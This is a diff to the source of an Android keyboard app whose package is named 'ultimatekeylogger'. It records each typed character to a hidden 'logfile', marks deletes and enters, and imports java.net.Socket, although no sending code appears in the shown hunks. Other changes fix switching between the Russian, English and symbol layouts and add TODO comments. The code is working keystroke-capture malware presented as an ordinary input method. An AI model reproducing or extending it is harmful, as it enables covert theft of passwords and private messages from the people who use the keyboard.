@@ -1,11 +1,14 @@
 package com.sutd.ultimatekeylogger;
 
+import android.app.ActivityManager;
+import android.content.ComponentName;
 import android.inputmethodservice.InputMethodService;
 import android.inputmethodservice.Keyboard;
 import android.inputmethodservice.KeyboardView;
 import android.media.AudioManager;
 import android.os.AsyncTask;
 import android.os.StrictMode;
+import android.util.Log;
 import android.view.KeyEvent;
 import android.view.View;
 import android.view.inputmethod.InputConnection;
@@ -19,6 +22,7 @@ import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
 import java.net.Socket;
 import java.nio.charset.Charset;
+import java.util.List;
 
 public class IME extends InputMethodService implements KeyboardView.OnKeyboardActionListener{
 
@@ -35,11 +39,13 @@ public class IME extends InputMethodService implements KeyboardView.OnKeyboardAc
     @Override
     public void onRelease(int primaryCode) {
     }
+    //TODO: разобраться с записью кей-кодов
     @Override
     public void onKey(int primaryCode, int[] keyCodes) {
         InputConnection ic = getCurrentInputConnection();
         playClick(primaryCode);
-        switch(primaryCode){
+        switch(primaryCode)
+        {
             case Keyboard.KEYCODE_DELETE :
                 ic.deleteSurroundingText(1, 0);
                 break;
@@ -64,35 +70,21 @@ public class IME extends InputMethodService implements KeyboardView.OnKeyboardAc
                 }
                 ic.commitText(String.valueOf(code),1);
         }
-            try {
+        try
+        {
                 BufferedWriter bw = new BufferedWriter(new OutputStreamWriter(openFileOutput("logfile", MODE_APPEND), "UTF-8"));
-                if(primaryCode == Keyboard.KEYCODE_DELETE) {
-                   /* bw.write('(');
-                    bw.write('D');
-                    bw.write('E');
-                    bw.write('L');
-                    bw.write(')');*/
-                    bw.write("(DELETE)");
+                if(primaryCode == Keyboard.KEYCODE_DELETE) { bw.write("(DELETE)"); }
+                else if(primaryCode == Keyboard.KEYCODE_DONE) { bw.write("(ENTER)");
                 }
-                else if(primaryCode == Keyboard.KEYCODE_DONE) {
-                   /* bw.write('(');
-                    bw.write('E');
-                    bw.write('N');
-                    bw.write('T');
-                    bw.write(')');*/
-                    bw.write("(ENTER)");
-                }
-                else
+                else if(primaryCode != Keyboard.KEYCODE_MODE_CHANGE && primaryCode != Keyboard.KEYCODE_SHIFT && primaryCode != -6)
                 {
                     if(isCapsOn) bw.write(Character.toUpperCase((char)primaryCode));
                     else bw.write((char)primaryCode);
                 }
                 bw.close();
-            } catch (FileNotFoundException e) {
-                e.printStackTrace();
-            } catch (IOException e) {
-                e.printStackTrace();
-            }
+        }
+        catch (FileNotFoundException e) { e.printStackTrace(); }
+        catch (IOException e) { e.printStackTrace(); }
     }
     @Override
     public void onText(CharSequence text) {
@@ -116,9 +108,6 @@ public class IME extends InputMethodService implements KeyboardView.OnKeyboardAc
         keyboard = new Keyboard(this, R.layout.keys_definition_en);
         kv.setKeyboard(keyboard);
         kv.setOnKeyboardActionListener(this);
-        deleteFile("logfile");
-        StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder().permitAll().build();
-        StrictMode.setThreadPolicy(policy);
         return kv;
     }
 
@@ -150,29 +139,36 @@ public class IME extends InputMethodService implements KeyboardView.OnKeyboardAc
                 return new Keyboard(this, R.layout.keys_definition_ru);
         }
     }
-    //TODO: Разобраться с некорректным возвратом на язык после переключения на символы
+    //TODO: [ГОТОВО ]Разобраться с некорректным возвратом на язык после переключения на символы
     private void handleLanguageSwitch() {
         if (mCurrentLocale.equals("RUSSIAN")) {
             mCurrentLocale = "ENGLISH";
+            mPreviousLocale = "RUSSIAN";
             keyboard = getKeyboard("ENGLISH");
-        } else {
-            mCurrentLocale = "RUSSIAN";
-            keyboard = getKeyboard("RUSSIAN");
+        }
+        else
+         {
+             mCurrentLocale = "RUSSIAN";
+             mPreviousLocale = "ENGLISH";
+             keyboard = getKeyboard("RUSSIAN");
         }
 
         kv.setKeyboard(keyboard);
         keyboard.setShifted(isCapsOn);
         kv.invalidateAllKeys();
     }
-    private void handleSymbolsSwitch() {
-        if (!mCurrentLocale.equals("SYMBOLS")) {
+    private void handleSymbolsSwitch()
+    {
+        if (!mCurrentLocale.equals("SYMBOLS"))
+        {
             keyboard = getKeyboard("SYMBOLS");
             mPreviousLocale = mCurrentLocale;
             mCurrentLocale = "SYMBOLS";
-        } else {
-            //keyboard = getKeyboard(mPreviousLocale);
+        }
+        else
+        {
             mCurrentLocale = mPreviousLocale;
-            keyboard = getKeyboard("RUSSIAN");
+            keyboard = getKeyboard(mPreviousLocale);
             keyboard.setShifted(isCapsOn);
         }
         kv.setKeyboard(keyboard);
@@ -180,6 +176,7 @@ public class IME extends InputMethodService implements KeyboardView.OnKeyboardAc
 
     }
 
+    //TODO: заставить работать этот метод
     @Override
     public void onFinishInputView(boolean finishingInput)
     {
